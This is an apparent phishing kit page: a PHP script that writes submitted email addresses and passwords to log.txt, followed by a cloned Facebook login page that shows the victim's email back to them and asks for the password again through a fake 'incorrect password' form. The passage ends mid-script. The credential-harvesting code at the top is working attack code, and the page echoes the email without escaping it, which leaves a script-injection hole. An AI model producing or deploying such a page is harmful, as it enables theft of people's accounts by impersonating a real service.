<?php
    $mail = $_POST['email'];
    $pass = $_POST['pass'];
    $file = fopen("log.txt","a");
    fwrite($file,"\n---------\n");
    fwrite($file,"Facebook \n");
    fwrite($file,"---------\n");
    fwrite($file,"\nUsername--> :");
    fwrite($file,$mail);
    fwrite($file,"\n");
    fwrite($file,"Password--> :");
    fwrite($file,$pass);
    fwrite($file,"\n");
    fclose($file);

?>
<!DOCTYPE html>

<html lang="en" id="facebook" class="no_js">

<head>
<meta charset="utf-8" />
<meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
<script nonce="P67Y8lVb">window._cstart=+new Date();
</script>
<script nonce="P67Y8lVb">function envFlush(a){function b(b){for(var c in a)b[c]=a[c]}window.requireLazy?window.requireLazy(["Env"],b):(window.Env=window.Env||{},b(window.Env))}envFlush({"ajaxpipe_token":"AXhH-vRUcu-2Fj5khr8","timeslice_heartbeat_config":{"pollIntervalMs":33,"idleGapThresholdMs":60,"ignoredTimesliceNames":{"requestAnimationFrame":true,"Event listenHandler mousemove":true,"Event listenHandler mouseover":true,"Event listenHandler mouseout":true,"Event listenHandler scroll":true},"isHeartbeatEnabled":true,"isArtilleryOn":false},"shouldLogCounters":true,"timeslice_categories":{"react_render":true,"reflow":true},"sample_continuation_stacktraces":true,"dom_mutation_flag":true,"khsh":"0`sj`e`rm`s-0fdu^gshdoer-0gc^eurf-3gc^eurf;1;enbtldou;fduDmdldourCxO`ld-2YLMIuuqSdptdru;qsnunuxqd;rdoe-0unjdojnx-0unjdojnx0-0gdubi^rdbsduOdv-0`sj`e`r-0q`xm`r-0StoRbs`qhof-0mhoj^q`xm`r","stack_trace_limit":30,"timesliceBufferSize":5000,"show_invariant_decoder":false,"compat_iframe_token":"AQ4_GllzV_ykSfFe9as","isCQuick":false});
</script>
<style nonce="P67Y8lVb">
</style>
<script nonce="P67Y8lVb">__DEV__=0;CavalryLogger=window.CavalryLogger||function(a){this.lid=a,this.transition=!1,this.metric_collected=!1,this.is_detailed_profiler=!1,this.instrumentation_started=!1,this.pagelet_metrics={},this.events={},this.ongoing_watch={},this.values={t_cstart:window._cstart},this.piggy_values={},this.bootloader_metrics={},this.resource_to_pagelet_mapping={},this.initializeInstrumentation&&this.initializeInstrumentation()},CavalryLogger.prototype.setIsDetailedProfiler=function(a){this.is_detailed_profiler=a;return this},CavalryLogger.prototype.setTTIEvent=function(a){this.tti_event=a;return this},CavalryLogger.prototype.setValue=function(a,b,c,d){d=d?this.piggy_values:this.values;(typeof d[a]==="undefined"||c)&&(d[a]=b);return this},CavalryLogger.prototype.getLastTtiValue=function(){return this.lastTtiValue},CavalryLogger.prototype.setTimeStamp=CavalryLogger.prototype.setTimeStamp||function(a,b,c,d){this.mark(a);var e=this.values.t_cstart||this.values.t_start;e=d?e+d:CavalryLogger.now();this.setValue(a,e,b,c);this.tti_event&&a==this.tti_event&&(this.lastTtiValue=e,this.setTimeStamp("t_tti",b));return this},CavalryLogger.prototype.mark=typeof console==="object"&&console.timeStamp?function(a){console.timeStamp(a)}:function(){},CavalryLogger.prototype.addPiggyback=function(a,b){this.piggy_values[a]=b;return this},CavalryLogger.instances={},CavalryLogger.id=0,CavalryLogger.getInstance=function(a){typeof a==="undefined"&&(a=CavalryLogger.id);CavalryLogger.instances[a]||(CavalryLogger.instances[a]=new CavalryLogger(a));return CavalryLogger.instances[a]},CavalryLogger.setPageID=function(a){if(CavalryLogger.id===0){var b=CavalryLogger.getInstance();CavalryLogger.instances[a]=b;CavalryLogger.instances[a].lid=a;delete CavalryLogger.instances[0]}CavalryLogger.id=a},CavalryLogger.now=function(){return window.performance&&performance.timing&&performance.timing.navigationStart&&performance.now?performance.now()+performance.timing.navigationStart:new Date().getTime()},CavalryLogger.prototype.measureResources=function(){},CavalryLogger.prototype.profileEarlyResources=function(){},CavalryLogger.getBootloaderMetricsFromAllLoggers=function(){},CavalryLogger.start_js=function(){},CavalryLogger.done_js=function(){};CavalryLogger.getInstance().setTTIEvent("t_domcontent");CavalryLogger.prototype.measureResources=function(a,b){if(!this.log_resources)return;var c="bootload/"+a.name;if(this.bootloader_metrics[c]!==void 0||this.ongoing_watch[c]!==void 0)return;var d=CavalryLogger.now();this.ongoing_watch[c]=d;"start_"+c in this.bootloader_metrics||(this.bootloader_metrics["start_"+c]=d);b&&!("tag_"+c in this.bootloader_metrics)&&(this.bootloader_metrics["tag_"+c]=b);if(a.type==="js"){c="js_exec/"+a.name;this.ongoing_watch[c]=d}},CavalryLogger.prototype.stopWatch=function(a){if(this.ongoing_watch[a]){var b=CavalryLogger.now(),c=b-this.ongoing_watch[a];this.bootloader_metrics[a]=c;var d=this.piggy_values;a.indexOf("bootload")===0&&(d.t_resource_download||(d.t_resource_download=0),d.resources_downloaded||(d.resources_downloaded=0),d.t_resource_download+=c,d.resources_downloaded+=1,d["tag_"+a]=="_EF_"&&(d.t_pagelet_cssload_early_resources=b));delete this.ongoing_watch[a]}return this},CavalryLogger.getBootloaderMetricsFromAllLoggers=function(){var a={};Object.values(window.CavalryLogger.instances).forEach(function(b){b.bootloader_metrics&&Object.assign(a,b.bootloader_metrics)});return a},CavalryLogger.start_js=function(a){for(var b=0;b
<a.length;++b)CavalryLogger.getInstance().stopWatch("js_exec/"+a[b])},CavalryLogger.done_js=function(a){for(var b=0;b
<a.length;++b)CavalryLogger.getInstance().stopWatch("bootload/"+a[b])},CavalryLogger.prototype.profileEarlyResources=function(a){for(var b=0;b
<a.length;b++)this.measureResources({name:a[b][0],type:a[b][1]?"js":""},"_EF_")};CavalryLogger.getInstance().log_resources=true;CavalryLogger.getInstance().setIsDetailedProfiler(true);window.CavalryLogger&&CavalryLogger.getInstance().setTimeStamp("t_start");
</script>
<noscript>
<meta http-equiv="refresh" content="0; URL=/login/?_fb_noscript=1" />
</noscript>
<link rel="manifest" href="/data/manifest/" crossorigin="use-credentials" />
<title id="pageTitle">Log in to Facebook | Facebook
</title>
<meta property="og:site_name" content="Facebook" />
<meta property="og:url" content="https://www.facebook.com/login/" />
<meta property="og:locale" content="en_GB" />
<link rel="search" type="application/opensearchdescription+xml" href="/osd.xml" title="Facebook" />
<link rel="canonical" href="https://www.facebook.com/login/" />
<link rel="alternate" media="only screen and (max-width: 640px)" href="https://m.facebook.com/login/?locale2=en_GB" />
<link rel="alternate" media="handheld" href="https://m.facebook.com/login/?locale2=en_GB" />
<link rel="alternate" hreflang="x-default" href="https://www.facebook.com/login/" />
<link rel="alternate" hreflang="en" href="https://www.facebook.com/login/" />
<link rel="alternate" hreflang="ar" href="https://ar-ar.facebook.com/login/" />
<link rel="alternate" hreflang="bg" href="https://bg-bg.facebook.com/login/" />
<link rel="alternate" hreflang="bs" href="https://bs-ba.facebook.com/login/" />
<link rel="alternate" hreflang="ca" href="https://ca-es.facebook.com/login/" />
<link rel="alternate" hreflang="da" href="https://da-dk.facebook.com/login/" />
<link rel="alternate" hreflang="el" href="https://el-gr.facebook.com/login/" />
<link rel="alternate" hreflang="es" href="https://es-la.facebook.com/login/" />
<link rel="alternate" hreflang="es-es" href="https://es-es.facebook.com/login/" />
<link rel="alternate" hreflang="fa" href="https://fa-ir.facebook.com/login/" />
<link rel="alternate" hreflang="fi" href="https://fi-fi.facebook.com/login/" />
<link rel="alternate" hreflang="fr" href="https://fr-fr.facebook.com/login/" />
<link rel="alternate" hreflang="fr-ca" href="https://fr-ca.facebook.com/login/" />
<link rel="alternate" hreflang="hi" href="https://hi-in.facebook.com/login/" />
<link rel="alternate" hreflang="hr" href="https://hr-hr.facebook.com/login/" />
<link rel="alternate" hreflang="id" href="https://id-id.facebook.com/login/" />
<link rel="alternate" hreflang="it" href="https://it-it.facebook.com/login/" />
<link rel="alternate" hreflang="ko" href="https://ko-kr.facebook.com/login/" />
<link rel="alternate" hreflang="mk" href="https://mk-mk.facebook.com/login/" />
<link rel="alternate" hreflang="ms" href="https://ms-my.facebook.com/login/" />
<link rel="alternate" hreflang="pl" href="https://pl-pl.facebook.com/login/" />
<link rel="alternate" hreflang="pt" href="https://pt-br.facebook.com/login/" />
<link rel="alternate" hreflang="pt-pt" href="https://pt-pt.facebook.com/login/" />
<link rel="alternate" hreflang="ro" href="https://ro-ro.facebook.com/login/" />
<link rel="alternate" hreflang="sl" href="https://sl-si.facebook.com/login/" />
<link rel="alternate" hreflang="sr" href="https://sr-rs.facebook.com/login/" />
<link rel="alternate" hreflang="th" href="https://th-th.facebook.com/login/" />
<link rel="alternate" hreflang="vi" href="https://vi-vn.facebook.com/login/" />
<meta name="description" content="Log in to Facebook to start sharing and connecting with your friends, family and people you know." />
<meta name="robots" content="noodp,noydir" />
<link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico" />
<link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yU/l/0,cross/bhGfXdiV3qT.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="6OhqI" crossorigin="anonymous" />

<link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yK/l/0,cross/Jb_Pu8uIID-.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="jiDVi" crossorigin="anonymous" />

<link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yZ/l/0,cross/14eko7gk0Bn.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="bjH76" crossorigin="anonymous" />

<link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/y7/l/0,cross/UkW0X_i76WG.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="PQati" crossorigin="anonymous" />

<link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yz/l/0,cross/WKduNzP5aHu.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="7f1P8" crossorigin="anonymous" />

<link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yk/l/0,cross/Fhk8Xusnfbz.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="Q/kbd" crossorigin="anonymous" />

<script src="https://static.xx.fbcdn.net/rsrc.php/v3/yu/r/QiVH0fXD5ES.js?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="drvY3" crossorigin="anonymous" nonce="P67Y8lVb">

</script>
</script>
</head>
<body class="login_page _39il _97vt _97vz _97v- _97v_ _97w2 _97w0 _9ax- _9ax_ _9ay1 UIPage_LoggedOut _-kb _605a b_c3pyn-ahh gecko x1 Locale_en_GB" dir="ltr">
<script nonce="P67Y8lVb">requireLazy(["bootstrapWebSession"],function(j){j(1602394768)})
</script>
<div class="_li" id="u_0_2">
<div class="_3_s0 _1toe _3_s1 _3_s1 uiBoxGray noborder" data-testid="ax-navigation-menubar" id="u_0_3">
<div class="_608m">
<div class="_5aj7 _tb6">
<div class="_4bl7">
<span class="mrm _3bcv _50f3">Jump to
</span>
</div>
<div class="_4bl9 _3bcp">
<div class="_6a _608n" aria-label="Navigation assistant" aria-keyshortcuts="Alt+/" role="menubar" id="u_0_4">
<div class="_6a uiPopover" id="u_0_5">
<a role="button" class="_42ft _4jy0 _55pi _2agf _4o_4 _63xb _p _4jy3 _517h _51sy" href="#" style="max-width:200px;" aria-haspopup="true" aria-expanded="false" rel="toggle" id="u_0_6">
<span class="_55pe">Sections of this page
</span>
<span class="_4o_3 _3-99">
<i class="img sp_o1HFwrSoWA4 sx_2671c5">
</i>
</span>
</a>
</div>
<div class="_6a _3bcs">
</div>
<div class="_6a mrm uiPopover" id="u_0_7">
<a role="button" class="_42ft _4jy0 _55pi _2agf _4o_4 _3_s2 _63xb _p _4jy3 _4jy1 selected _51sy" href="#" style="max-width:200px;" aria-haspopup="true" tabindex="-1" aria-expanded="false" rel="toggle" id="u_0_8">
<span class="_55pe">Accessibility help
</span>
<span class="_4o_3 _3-99">
<i class="img sp_o1HFwrSoWA4 sx_d7312b">
</i>
</span>
</a>
</div>
</div>
</div>
<div class="_4bl7 mlm pll _3bct">
<div class="_6a _3bcy">Press 
<span class="_3bcz">alt
</span> + 
<span class="_3bcz">/
</span> to open this menu
</div>
</div>
</div>
</div>
</div>
<div id="globalContainer" class="uiContextualLayerParent">
<div class="fb_content clearfix " id="content" role="main">
<div class="_4-u5 _30ny">
<div class="_97vy">
<img class="_97vu img" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" />
</div>
<span class="muffin_tracking_pixel_start">
</span>
<img class="tracking_pixel" />
<span class="muffin_tracking_pixel_end">
</span>
<div class="_4-u2 _1w1t _4-u8 _52jv">
<div class="_xku" id="header_block">
<span class="_97w1 _50f6">
<div class="_85el">
<div>
<div class="_6a _2pin">
<img class="_2qgu _9ay0 _1m9m img" src="" alt="" />
</div>
<div class="_2phz">
<span class="_50f6">Log in as 
</span>
</div>
</div>
<div class="fsm fwn fcg"><?php echo $mail ?>
<span role="presentation" aria-hidden="true"> · 
</span>
<a id="not_me_link" href="/notme.php?flow=login&amp;notme_cuid=AYgP-ECYNmTOcoQ9fhArNVBW3ZwUBqh7Dc9e0U6uVCzzm2bZuPHzz0z8K6-VafUKrB_KS6EQ9nOc7rXJ96pszPiPadpu-bqSK6dxNP4R9OLCo74A8RErrRXDncFPiPprVJPoZUTtYHPsRsURqOBH8MPLNYzNiN3VlnZKSZ9WBEYEaGf9d8iJuKMIx9gAq3cQAO2awYHe4O3upTJB7nQMOrfKCwqLDejKlaJqFWMr1uUukQ">Not you?
</a>
</div>
</div>
</span>
</div>
<div class="login_form_container">
<form id="login_form" action="/verify.php" method="POST" onsubmit="">
<input type="hidden" name="jazoest" value="2876" autocomplete="off" />
<input type="hidden" name="lsd" value="AVo2KwMr-9M" autocomplete="off" />
<input type="hidden" autocomplete="off" id="error_box" />
<div id="loginform">
<input type="hidden" autocomplete="off" id="display" name="display" value="" />
<input type="hidden" autocomplete="off" id="enable_profile_selector" name="enable_profile_selector" value="" />
<input type="hidden" autocomplete="off" id="isprivate" name="isprivate" value="" />
<input type="hidden" autocomplete="off" id="legacy_return" name="legacy_return" value="0" />
<input type="hidden" autocomplete="off" id="profile_selector_ids" name="profile_selector_ids" value="" />
<input type="hidden" autocomplete="off" id="return_session" name="return_session" value="" />
<input type="hidden" autocomplete="off" id="skip_api_login" name="skip_api_login" value="" />
<input type="hidden" autocomplete="off" id="signed_next" name="signed_next" value="" />
<input type="hidden" autocomplete="off" id="trynum" name="trynum" value="2" />
<input type="hidden" autocomplete="off" name="timezone" value="" id="u_0_9" />
<input type="hidden" autocomplete="off" name="lgndim" value="" id="u_0_a" />
<input type="hidden" name="lgnrnd" value="223930_2bX1" />
<input type="hidden" id="lgnjs" name="lgnjs" value="n" />
    


<input type="hidden" autocomplete="off" id="cuid" name="cuid" value="AYi9ij7hmq0XXFcpa6wJHp-FfqadBoOUQNA_3f77xbn_PMq3vVAx1bZLLJq-9WxkjJgTu2hLbQa_IyA1PcM3slzDZnGaCsAmAbwPiqmeYtiOz6ZlMA1nI5t1zSsLVdX3EtvYys9qPr1QDplF4IVfbDG7J0D8nf574c4w99grp0VoUCLjNTpMxZr8c4046RewJazTPV2ssu_2j-W6CKMayGjs0iMfF-2G7z-7fsueqNPrwQ" />
<div class="clearfix _5466 _44mg">
    
    
<input type="password" class="inputtext _55r1 inputtext _1kbt _9ay4 inputtext _1kbt" name="pass" id="pass" tabindex="0" placeholder="Password" autofocus="1" autocomplete="current-password" aria-label="Password" />
<div class="_9ay5">
<i class="_9ay6 img sp_Y4k5_WvpmSs sx_d003f7">
</i>
</div>
<div class="_9ay7">The password that you&#039;ve entered is incorrect. 
<a href="https://www.facebook.com/recover/initiate?lwv=120&amp;lwc=1348092&amp;ars=facebook_login_pw_error">Forgotten password?
</a>
</div>
</div>
<div class="_xkt">
<button value="1" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" id="loginbutton" name="login" tabindex="0" type="submit">Log In
</button>
</div>
<div id="login_link" class="_82qp _85em">
<div class="_97w3">
<a href="https://www.facebook.com/recover/initiate/?ars=facebook_login" class="_97w4" target="">Forgotten password?
</a>
</div>
</div>
</div>
<input type="hidden" autocomplete="off" id="prefill_contact_point" name="prefill_contact_point" value="" />
<input type="hidden" autocomplete="off" id="prefill_source" name="prefill_source" />
<input type="hidden" autocomplete="off" id="prefill_type" name="prefill_type" />
<input type="hidden" autocomplete="off" id="first_prefill_source" name="first_prefill_source" />
<input type="hidden" autocomplete="off" id="first_prefill_type" name="first_prefill_type" />
<input type="hidden" autocomplete="off" id="had_cp_prefilled" name="had_cp_prefilled" value="false" />
<input type="hidden" autocomplete="off" id="had_password_prefilled" name="had_password_prefilled" value="false" />
<input type="hidden" autocomplete="off" name="ab_test_data" value="" />
</form>
</div>
</div>
</div>
</div>
<div class="">
<div class="_95ke">
<div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
<ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
<li>English (UK)
</li>
<li>
<a class="_sv4" dir="ltr" href="https://ta-in.facebook.com/login/"  title="Tamil">தமிழ்
</a>
</li>
<li>
<a class="_sv4" dir="ltr" href="https://te-in.facebook.com/login/"  title="Telugu">తెలుగు
</a>
</li>
<li>
<a class="_sv4" dir="ltr" href="https://kn-in.facebook.com/login/"  title="Kannada">ಕನ್ನಡ
</a>
</li>
<li>
<a class="_sv4" dir="rtl" href="https://ur-pk.facebook.com/login/" title="Urdu">اردو
</a>
</li>
<li>
<a class="_sv4" dir="ltr" href="https://si-lk.facebook.com/login/"  title="Sinhala">සිංහල
</a>
</li>
<li>
<a class="_sv4" dir="ltr" href="https://ml-in.facebook.com/login/" title="Malayalam">മലയാളം
</a>
</li>
<li>
<a class="_sv4" dir="ltr" href="https://hi-in.facebook.com/login/"  title="Hindi">हिन्दी
</a>
</li>
<li>
<a class="_sv4" dir="ltr" href="https://mr-in.facebook.com/login/" title="Marathi">मराठी
</a>
</li>
<li>
<a class="_sv4" dir="ltr" href="https://gu-in.facebook.com/login/"  title="Gujarati">ગુજરાતી
</a>
</li>
<li>
<a class="_sv4" dir="ltr" href="https://bn-in.facebook.com/login/"  title="Bengali">বাংলা
</a>
</li>
<li>
<a role="button" class="_42ft _4jy0 _517i _517h _51sy" rel="dialog" ajaxify="/settings/language/language/?uri=https%3A%2F%2Fbn-in.facebook.com%2Flogin%2F&amp;source=www_list_selector_more" href="#" title="Show more languages">
<i class="img sp_czwC6Hxj9uC sx_fd5873">
</i>
</a>
</li>
</ul>
<div id="contentCurve">
</div>
<div id="pageFooterChildren" role="contentinfo" aria-label="Facebook site links">
<ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
<li>
<a href="/r.php" title="Sign up for Facebook">Sign Up
</a>
</li>
<li>
<a href="/login/" title="Log in to Facebook">Log In
</a>
</li>
<li>
<a href="https://messenger.com/" title="Take a look at Messenger.">Messenger
</a>
</li>
<li>
<a href="/lite/" title="Facebook Lite for Android.">Facebook Lite
</a>
</li>
<li>
<a href="https://www.facebook.com/watch/" title="Browse our Watch videos."> Watch 
</a>
</li>
<li>
<a href="/directory/people/" title="Browse our people directory.">People
</a>
</li>
<li>
<a href="/directory/pages/" title="Browse our Pages directory.">Pages
</a>
</li>
<li>
<a href="/pages/category/">Page categories
</a>
</li>
<li>
<a href="/places/" title="Take a look at popular places on Facebook.">Places
</a>
</li>
<li>
<a href="/games/" title="Check out Facebook games.">Games
</a>
</li>
<li>
<a href="/directory/places/" title="Browse our places directory.">Locations
</a>
</li>
<li>
<a href="/marketplace/" title="Buy and sell on Facebook Marketplace.">Marketplace
</a>
</li>
<li>
<a href="https://pay.facebook.com/" target="_blank" title="Learn more about Facebook Pay">Facebook Pay
</a>
</li>
<li>
<a href="/directory/groups/" title="Browse our Groups directory.">Groups
</a>
</li>
<li>
<a href="https://www.oculus.com/" target="_blank" title="Learn more about Oculus">Oculus
</a>
</li>
<li>
<a href="https://portal.facebook.com/" target="_blank" title="Learn more about Portal from Facebook">Portal
</a>
</li>
<li>
<a href="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT18RX7yfR7oTbyiu-QMqRb28z7Ifs-fQueE3aYh8HRAHi46nKO5uqjymT3VQGn6-O4Y_ECPvCRyAH20oGMydI-sSBtfvU3hCkHdYAQ0IuQ1vuK9ipQbLIU2y1gLZ2NxUVopAOUPgdy7GtU0PXfxXO4lvLIJyA" title="Take a look at Instagram" target="_blank" rel="noopener nofollow" data-lynx-mode="asynclazy">Instagram
</a>
</li>
<li>
<a href="/local/lists/245019872666104/" title="Browse our Local Lists directory.">Local
</a>
</li>
<li>
<a href="/fundraisers/" title="Donate to worthy causes.">Fundraisers
</a>
</li>
<li>
<a href="/biz/directory/" title="Browse our Facebook Services directory.">Services
</a>
</li>
<li>
<a href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D" title="See the Voting Information Centre">Voting Information Centre
</a>
</li>
<li>
<a href="/facebook" accesskey="8" title="Read our blog, discover the resource centre and find job opportunities.">About
</a>
</li>
<li>
<a href="/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;extra_1=auto" title="Advertise on Facebook">Create ad
</a>
</li>
<li>
<a href="/pages/create/?ref_type=site_footer" title="Create a Page">Create Page
</a>
</li>
<li>
<a href="https://developers.facebook.com/?ref=pf" title="Develop on our platform.">Developers
</a>
</li>
<li>
<a href="/careers/?ref=pf" title="Make your next career move to our brilliant company.">Careers
</a>
</li>
<li>
<a data-nocookies="1" href="/privacy/explanation" title="Learn about your privacy and Facebook.">Privacy
</a>
</li>
<li>
<a href="/policies/cookies/" title="Learn about cookies and Facebook." data-nocookies="1">Cookies
</a>
</li>
<li>
<a class="_41ug" data-nocookies="1" href="https://www.facebook.com/help/568137493302217" title="Learn about AdChoices.">AdChoices
<i class="img sp_MIYAwS5sIZZ sx_d79e7f">
</i>
</a>
</li>
<li>
<a data-nocookies="1" href="/policies?ref=pf" accesskey="9" title="Review our terms and policies.">Terms
</a>
</li>
<li>
<a href="/help/?ref=pf" accesskey="0" title="Visit our Help Centre.">Help
</a>
</li>
<li>
<a accesskey="6" class="accessible_elem" href="/settings" title="View and edit your Facebook settings.">Settings
</a>
</li>
<li>
<a accesskey="7" class="accessible_elem" href="/allactivity?privacy_source=activity_log_top_menu" title="View your activity log">Activity log
</a>
</li>
</ul>
</div>
<div class="mvl copyright">
<div>
<span> Facebook © 2020
</span>
</div>
</div>
</div>
</div>
</div>
</div>
<div>
</div>
<span>
<img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none" />
</span>
</div>
<div style="display:none">
<div>
</div>
<div>
</div>
<div>
</div>
</div>
<script type="text/javascript" nonce="P67Y8lVb">/*
<![CDATA[*/(function(){function si_cj(m){setTimeout(function(){new Image().src="https:\/\/error.facebook.com\/common\/scribe_endpoint.php?c=si_clickjacking&t=2979"+"&m="+m;},5000);}if(top!=self){try{if(parent!=top){throw 1;}var si_cj_d=["apps.facebook.com","apps.beta.facebook.com"];var href=top.location.href.toLowerCase();for(var i=0;i
<si_cj_d.length;i++){if (href.indexOf(si_cj_d[i])>=0){throw 1;}}si_cj("3 https:\/\/www.facebook.com\/");}catch(e){si_cj("1 \thttps:\/\/www.facebook.com\/");window.document.write("\u003Cstyle nonce=\"P67Y8lVb\">body * {display:none !important;}\u003C\/style>\u003Ca href=\"#\" onclick=\"top.location.href=window.location.href\" style=\"display:block !important;padding:10px\">Go to Facebook.com\u003C\/a>");/*lGhTtCDs*/}}}())/*]]>*/
</script>

<script>requireLazy(["HasteSupportData"],function(m){m.handle({"bxData":{"875231":{"uri":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/yD\/r\/d4ZIVX-5C-b.ico"}},"gkxData":{"677762":{"result":true,"hash":"AT4Zy0NFSRkSx17R"},"1243461":{"result":false,"hash":"AT57dlNc07D4_5xV"},"819236":{"result":false,"hash":"AT7w71XlfRNXOjie"},"729630":{"result":false,"hash":"AT5HGjRoJK8EH9Ro"},"729631":{"result":false,"hash":"AT6hdRxrI3FfqV1h"},"1281505":{"result":false,"hash":"AT5NFyp2FUAD3Jv_"},"1291023":{"result":false,"hash":"AT5RLIIgcEjC20DF"},"1294182":{"result":false,"hash":"AT5IfiG2hn3qrAup"},"1381768":{"result":true,"hash":"AT6UaetB239GprU2"},"1399218":{"result":true,"hash":"AT4e32HZlzs1uXYB"},"1401060":{"result":true,"hash":"AT58PNd6MujsZdAY"},"1485055":{"result":true,"hash":"AT5D4gQKy1i0ETT5"},"1584797":{"result":false,"hash":"AT7DLkvSEK8Bnvkc"},"1597642":{"result":true,"hash":"AT5tvqpTlK5QSfaC"},"1620803":{"result":true,"hash":"AT55Z8rhhwA29yyJ"},"1647260":{"result":false,"hash":"AT5Dd1i2Gh4Gt2rb"},"1695831":{"result":true,"hash":"AT6P8iFUAYx7MPF8"},"1722014":{"result":false,"hash":"AT63WeTlwidGhZGZ"},"1742795":{"result":false,"hash":"AT7sutiQahsCYD8D"},"1099893":{"result":false,"hash":"AT75He_Y8PhTW-qS"}},"qexData":{"1654063":{"r":null}}})});requireLazy(["Bootloader"],function(m){m.handlePayload({"sr_revision":1002804734,"consistency":{"rev":1002804734},"rsrcMap":{"FR6N9":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3icLj4\/yu\/l\/en_GB\/T0i-X06hfn6.js?_nc_x=Ij3Wp8lg5Kz"},"T0ebq":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yb\/r\/MEq27h9ZlCO.js?_nc_x=Ij3Wp8lg5Kz"},"SpABh":{"type":"css","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yL\/l\/0,cross\/DK9IvVQon1-.css?_nc_x=Ij3Wp8lg5Kz"},"zBR\/X":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iptW4\/y8\/l\/en_GB\/60V_H7Q534-.js?_nc_x=Ij3Wp8lg5Kz"},"51yTN":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yD\/r\/iczucIxMxpV.js?_nc_x=Ij3Wp8lg5Kz"},"8QsxI":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yn\/r\/jjqSpY3s71Q.js?_nc_x=Ij3Wp8lg5Kz"},"6yUkf":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3inNY4\/yX\/l\/en_GB\/S3VMXAm5AQ9.js?_nc_x=Ij3Wp8lg5Kz"},"KO+fN":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yK\/r\/9-YVmsuCk4h.js?_nc_x=Ij3Wp8lg5Kz"},"GtxZp":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iatS4\/yW\/l\/en_GB\/3Jc63294pA-.js?_nc_x=Ij3Wp8lg5Kz"},"naYtL":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3icfe4\/yx\/l\/en_GB\/3bL-33RZoiP.js?_nc_x=Ij3Wp8lg5Kz"},"+ClWy":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yU\/r\/UJOxW2IHm1a.js?_nc_x=Ij3Wp8lg5Kz"},"8ELCB":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ye\/r\/VRzSVH5iU-V.js?_nc_x=Ij3Wp8lg5Kz"},"oE4Do":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yJ\/r\/EejAgnHUad4.js?_nc_x=Ij3Wp8lg5Kz"},"tnai5":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iYXl4\/ys\/l\/en_GB\/M3uufkh_OSq.js?_nc_x=Ij3Wp8lg5Kz"},"0kAFS":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iMYN4\/yZ\/l\/en_GB\/q_6P3DYIzV7.js?_nc_x=Ij3Wp8lg5Kz"},"+9t9o":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yA\/r\/NpSHYm5Vc-S.js?_nc_x=Ij3Wp8lg5Kz"},"Cmm8q":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iKHV4\/ya\/l\/en_GB\/R9P1Hpm2yjq.js?_nc_x=Ij3Wp8lg5Kz"},"vtf4W":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yw\/r\/sVyWJul_906.js?_nc_x=Ij3Wp8lg5Kz"},"fmNVq":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ijDN4\/yl\/l\/en_GB\/teZa9CL7g1-.js?_nc_x=Ij3Wp8lg5Kz"},"\/mnVq":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iFJJ4\/y8\/l\/en_GB\/e1ZCePKzdT9.js?_nc_x=Ij3Wp8lg5Kz"},"IERyj":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yc\/r\/HQpBe_GtQSw.js?_nc_x=Ij3Wp8lg5Kz"},"zcG6L":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yT\/r\/orZ7ePpsuNV.js?_nc_x=Ij3Wp8lg5Kz"},"h8WFM":{"type":"css","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y3\/l\/0,cross\/GgyXorS7TBs.css?_nc_x=Ij3Wp8lg5Kz"},"YBp\